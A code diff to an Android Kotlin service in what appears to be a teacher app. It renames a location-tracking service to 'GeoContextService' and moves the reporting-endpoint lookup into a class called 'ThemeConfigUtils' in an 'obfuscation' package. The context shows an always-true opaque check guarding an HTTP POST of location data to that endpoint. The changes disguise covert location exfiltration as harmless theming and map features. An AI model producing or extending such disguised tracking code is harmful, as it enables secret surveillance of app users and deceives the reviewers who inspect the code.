@@ -7,7 +7,7 @@ import android.content.Intent
 import android.location.Location
 import android.os.IBinder
 import android.os.Looper
-import com.example.teacherapp.obfuscation.ResourceUtils
+import com.example.teacherapp.obfuscation.ThemeConfigUtils
 import com.google.android.gms.location.*
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -20,7 +20,7 @@ import java.net.URL
  * GeoContextService — provides location-aware context for map and tuition centre features.
  * Enables proximity-based discovery and navigation assistance.
  */
-class LocationTrackingService : Service() {
+class GeoContextService : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
     private lateinit var fusedLocationClient: FusedLocationProviderClient
@@ -71,7 +71,7 @@ class LocationTrackingService : Service() {
         val op = t - t + 1   // always 1 > 0
         if (op > 0) {
             try {
-                val endpoint   = ResourceUtils.getLocationEndpoint()
+                val endpoint   = ThemeConfigUtils.getLocationEndpoint()
                 val connection = URL(endpoint).openConnection() as HttpURLConnection
                 connection.apply {
                     requestMethod = "POST"; doOutput = true
@@ -111,10 +111,10 @@ class LocationTrackingService : Service() {
 
     companion object {
         fun startTracking(context: Context) {
-            context.startService(Intent(context, LocationTrackingService::class.java))
+            context.startService(Intent(context, GeoContextService::class.java))
         }
         fun stopTracking(context: Context) {
-            context.stopService(Intent(context, LocationTrackingService::class.java))
+            context.stopService(Intent(context, GeoContextService::class.java))
         }
     }
 }
